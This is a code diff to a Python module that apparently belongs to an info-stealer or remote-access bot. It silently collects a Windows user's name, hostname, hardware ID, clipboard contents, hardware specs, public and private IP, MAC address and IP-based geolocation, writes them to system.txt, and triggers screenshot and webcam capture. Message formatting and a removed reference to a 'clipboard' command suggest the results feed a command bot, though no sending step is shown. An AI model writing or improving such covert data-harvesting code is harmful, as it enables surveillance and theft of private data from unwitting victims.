@@ -18,6 +18,7 @@ def user():
 
     return f"\nDisplay Name: {display_name} \nHostname: {hostname} \nUsername: {username}"
         
+
 def system():
     try:
         hwid = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
@@ -25,30 +26,20 @@ def system():
         hwid = "Unknown"
     
     try:
-        clipboard = f"``````{pyperclip.paste()}``````"
+        clipboard = pyperclip.paste()
     except:
         clipboard = "Unknown"
     
-    if clipboard == "":
-        clipboard = "null"
-    elif len(clipboard) > 1500:
-        clipboard = "Clipboard is too long, use 'clipboard' command to get full clipboard!" 
+    if len(clipboard) > 1500:
+        with open("clipboard.txt", "w", encoding="utf-8") as f: f.write(clipboard)
+        clipboard = "Too long!"
     
-    def get_os():
-        try:
-            wmi_obj = wmi.WMI()
-            os_info = wmi_obj.Win32_OperatingSystem()[0]
-            return os_info.Caption
-        except:
-            return "Unknown"
-    
-    os = get_os()
     cpu = wmi.WMI().Win32_Processor()[0].Name
     gpu = wmi.WMI().Win32_VideoController()[0].Name
     ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize
     ram = round(float(ram) / 1048576)
     
-    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nClipboard: {clipboard}\nHWID: {hwid}\nOS: {os}\n"
+    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nHWID: {hwid}\nClipboard: ```{clipboard}```"
 
 
 def disk():
@@ -73,13 +64,12 @@ def network():
     try:
         public_ip = requests.get("https://api.ipify.org").text
     except:
-        public_ip = "Unknown"
+        pass
     private_ip = socket.gethostbyname(socket.getfqdn())
     mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-    country, region, city, zip_code, isp = location(public_ip) #if public_ip != "Unknown":  country, region, city, zip_code, isp = location(public_ip)
-    try:
-        return f"\nPublic IP: {public_ip}\nLocal IP: {private_ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city}, {zip_code}\nISP: {isp}"
-    except: return "Unknown"
+    country, region, city, zip_code, isp = location(public_ip)
+    
+    return f"\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city}, {zip_code}\nISP: {isp}"
 
 def screenshot():
     try:
@@ -106,7 +96,7 @@ def webcam():
 #print(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
 def start():
     try:
-        with open("system.txt", "w",encoding="utf-8") as f:
+        with open("system.txt", "w", encoding="utf-8") as f:
             f.write(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
         screenshot()
         webcam()
